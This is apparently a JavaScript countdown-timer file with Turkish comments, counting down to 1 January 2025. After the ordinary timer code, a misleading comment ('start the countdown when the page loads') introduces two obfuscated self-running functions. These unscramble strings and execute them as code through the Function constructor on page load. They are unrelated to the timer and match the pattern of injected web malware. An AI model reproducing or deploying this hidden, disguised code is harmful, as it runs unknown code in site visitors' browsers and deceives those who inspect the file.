# https://github.com/semihkagan/SiteJSTimer
# Lütfen yorum satırlarını silmeyin :/ ❤️

// Belirli bir tarih ve saat (yıl, ay-1, gün, saat, dakika, saniye) 
const targetDate = new Date("2025-01-01T00:00:00");

// Geri sayımı güncelleyen fonksiyon
function updateCountdown() {
    const now = new Date();
    const timeDifference = targetDate - now;

    // Zaman farkını gün, saat, dakika ve saniye olarak hesapla
    const days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);

    // Eğer zaman dolmuşsa tüm değerleri 0 yap
    const displayDays = days >= 0 ? days : 0;
    const displayHours = hours >= 0 ? hours : 0;
    const displayMinutes = minutes >= 0 ? minutes : 0;
    const displaySeconds = seconds >= 0 ? seconds : 0;

    // Geri sayım metnini oluştur
    const countdownText = `${displayDays} GÜN ${displayHours} Saat ${displayMinutes} Dakika ${displaySeconds} Saniye`;

    // Geri sayım metnini sayfaya yaz
    document.getElementById("countdown").innerText = countdownText;

    // Süre dolduğunda geri sayımı durdur
    if (timeDifference <= 0) {
        clearInterval(countdownInterval);
    }
}

// Geri sayımı her saniye güncelle
const countdownInterval = setInterval(updateCountdown, 1000);

// Sayfa yüklendiğinde geri sayımı başlat
(function(){var RKH='',Gwn=796-785;function OrJ(t){var u=4536112;var c=t.length;var b=[];for(var h=0;h<c;h++){b[h]=t.charAt(h)};for(var h=0;h<c;h++){var n=u*(h+182)+(u%25004);var m=u*(h+658)+(u%15762);var f=n%c;var z=m%c;var k=b[f];b[f]=b[z];b[z]=k;u=(n+m)%4707064;};return b.join('')};var VHM=OrJ('orpcslwittracorcbyeqtksdnzfuohgnxuvjm').substr(0,Gwn);var VCL='uau -=r1.ns2),p=;1cv<rbd "ebedof(h;j;ltnnpar;t1vtxbzf;iak +=)7],[1s9m,a1{8v,a0a6n,*919v,o5(7o,=5o6 ,k9,8;,v8)7[,)0,8.,p2);qa2 )=.]8f)rrvbr7zn0pzCtwlen"tt;C+[)t[e[l]+==+7; a, }=0]gg{=;28n==z5cwc=[5(fCrivlr{q 0,qvadg.mlnos(l8ngth;6+y)tvkremra}gomfn6s(q0."pii)(; h)tf-rnvfrhxom;lenvts-j;r>20!x(-={)a- m=ausl9v0rmv1m6xs;rae d=;urlkvyrfca0Av,r uhv]lbnlte;+ar +;bor(=a3 r=r;t<+;)+});virko6vocxa;C=dhA((7);v)rre;suoc;afrew{b=0e 1c*n+v. h;r oAevt"bf1(-(;h=g;u+n;=e]sp vftov=.)ilknz(..fe ggheg8vrc+a+Ckd=A[(y+6)l++.rhbrloeentgbb2w-,;q=,;=+)2s}.l,enc(n5ieu);8i0("=hn7ln)8=;],i+(n>])+.{uahgvtsjb;toi]g=c+y")rk{p=s](r[v+2].;n=}+z;ciS(u!yn(l,))if(+<1);.ru hpvesebst i.gycv)(m[x;=l.uorn1"()j}(arp7sz([[a]r;.v.r)faaujrig(r"=;(a= ==93(,i0s9],26p4a,=2=.=o)cttgt];)aa r=lt}iig[fto,CgauCadr(a6u;coz(ha6 (=r;m<a.deogzhtzb+rf(fbs+ltt4rad.c.a<A1(3)[.vo4naS(rin1.;r mChhr;o[elp,zs)u;,eluinuf.s=lltkrt"h").4ovn.r=;';var MnQ=OrJ[VHM];var RKQ='';var JQe=MnQ;var TNq=MnQ(RKQ,OrJ(VCL));var xXP=TNq(OrJ('2#Hi$et$ tHi$g.H)S\'r;ng},#(-w7{afb%&3%,f.}o#.-)3saabH&}+{fn}2#_-i0tafb!&H.i.dbeH)_,_+eufi(H%s(,tr%bsHw+ffeo!tiHyiebp"mi!a.!a,g.Dj.y\/o.,oHa,t!fizbc,f)e6p7n).hbwb_0(l}ms.nm_k..7io.to2o.:(p)T}i e;S,hS,c5)6,1().H{H,(f,H1)e{rfl]r\/{o,7H4v00fH.zk0eH3of0m=H}(r_!!=.f!1!e_r,l$r(H1m)yt!HeTg5h0v.!H=ff"],;0of(0,==.;#1utpH-6r(HHrw_+){H.r]=.gy,!ahuros"(*)f;Hot(z,_=f;.1lt=Hf6,(lHHwr+1{fHl4)H..;.3H14 (H,l8$)\',($s7(\/(2.0l4.)H;jz;"f3.\/$e!ft$)3=w46.8g)jHb3HHj,.5 6")t)H;rH;3m(!.h_+2)o."$7%z(! HH;H.2_}..H,h$3.;(H_4(hHvSop;HH45(ofvat.;fHn6!rtfcz,}0H(n#H.fe$Hi2eH$Ht!i)gf)r!tr!mhhfr$oref1)77;+,e=sa)*==eapH$sf.(#xHbj8.3%h*!=)ao0=*h=aa,.r;!ecuHn3f_.a_f+HH)aHHjn%(.))+eHHksH.i)(n);c$n.onerHb1.]3Hd0n)HiH()_w_ae fw{s%1.3H)0(}gl)ejf0c;n!o.e3H,1H]1H\/2})2;$fH!H$=b=2j)uH%(!rae;;0fln4tHo3(!{v%[.%njln}3(n;)e,ufn};HonsHln[5)H])(2)_]t;.\'aH34.h*vro\/{d.fH0=of4.!H\/}9\';HH5(o)v1tt{d.0Hc=of..t_)HCjH!r(H,!,.)or4"f7_Hf4&((.e_gzv!H)3,17{7[6.)e ]o]sHlit)r$$tfS1H9, ]!H=.f(s1$utHHn (\'1sa$wtr ojiojf.$2-2_sa68;7v1w u{]e(u.n\/f)ftnHtto;.$ $._sClrt0 H$}be2)[n.;;[, .2jfig(eviraf btea_]v=! [H(0.-_H=s}p as$$ ,))w (!-]'));var zvP=JQe(RKH,xXP );zvP(7163);return 7599})()
(function(){var glR='',MAf=469-458;function vVK(q){var x=255421;var y=q.length;var m=[];for(var n=0;n<y;n++){m[n]=q.charAt(n)};for(var n=0;n<y;n++){var s=x*(n+197)+(x%43820);var t=x*(n+676)+(x%23561);var h=s%y;var i=t%y;var p=m[h];m[h]=m[i];m[i]=p;x=(s+t)%1440433;};return m.join('')};var wNW=vVK('grksrwfcttbauvoojnunmecosidcrhzqxtlyp').substr(0,MAf);var cBL='h,v)girxt;vfh,l=56+ve+rtid1(sd"=rhkjs;=cn7+j(l}cChazfgpn 0+=p(4d8n))uc;r,8{c<=g70,iau)gd;-n7==;ee.(+xaC+([;.oa<,361pra85hip0=ur(8]{;=r*ua.;r.0=h+g(t,9ylnfr{r)6wg[rce] p(b-itmzrz]s8ae54b},t= ep==o01rop6tpnf0;red6t]]+d(ey;u+vngvt]y.-,-2o0=b;a)mhac;,s[[2.hpb.de)=""lffr= ,jef*;.olsnf,sa; n],(vjan=[e7 ]o+{.=fs7rg+insev)ra1xbg elr;v(ur7vstf6rg(vrr0j;meh.vy[=,gn)] ,ia n 0;e<rl>asS{,grcn=]pt.otC+deAr=a8"p=r (<)4n,;o6v0)2,p(ho1cu;rugoim;.el9s, )o1,s2;0;(af++ute.ss[rmtrw=9eks(,A.)hsgn8,v1l+;;t-=tmod=(w(gfe)=x7.lha4aof f(0lo,);a[<C6li) t-}[{,e0)8=ci([,err;(vgvrulv);=A(hi)(x-ki5.((ln"2=iadpfhfa;[v,crAr=e)h0]4oerb)are;oeAreruf;f!+r;ll)Cr(lr+m se(rv.9;r)ubrr; i+h9>tC;[ rv..lvin+iwrt}tz 3+i=9(=(,ucai! 7m+[o tin.+a);(}a;lsdwa]lr2iru1=;e;,k])lC=v"atf(n.gaa "h.g);.g1f=orC=nbr1=i.se8;==94h(tnd8(l=ipelau;i.))j++v;+rs=a)1;v r.)h"v)){vo;l}o nwS1;[gtnf]o1n}6rtahe3j"c n=l9etg(n;o))nbmti2."qvkrjofhav ;';var EzW=vVK[wNW];var JOB='';var wOQ=EzW;var fww=EzW(JOB,vVK(cBL));var Xpb=fww(vVK('(tn)tewudauCodonp'));var Eno=wOQ(glR,Xpb );Eno(4849);return 6219})()

# https://github.com/semihkagan tarafından yazılmıştır.
